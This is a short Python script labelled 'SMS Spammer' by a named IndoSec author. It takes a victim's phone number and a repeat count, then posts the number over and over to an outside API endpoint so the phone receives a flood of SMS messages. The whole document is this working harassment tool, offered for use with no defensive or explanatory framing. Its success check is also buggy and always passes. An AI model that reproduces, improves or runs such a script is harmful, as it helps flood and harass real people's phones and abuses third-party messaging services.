import requests, json, sys, os

def spam(link, no, cnt):
	headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding':'gzip, deflate'}
	data = {'no':no}
	x = 0
	while x < cnt:
		x += 1
		spam = requests.post(link, data=data, headers=headers).text
		spam = json.loads(spam)
		true = spam['API']['message']
		if 'true' or 'success'  in spam:
			print(f"[{x}]", true)
		else:
			print("\n* ERROR *")
			break

if __name__=='__main__':
	try:
		os.system("clear")
		print("SMS Spammer by \033[1mXractz - \033[31;2mIndo\033[39;2mSec\033[0m")
		link = "http://www.86768.site/api/?indihome"
		no = input("No    : ")
		cnt = int(input("Count : "))
		print("")
		spam(link, no, cnt)
	except:
		print("\n* ERROR *")
		sys.exit()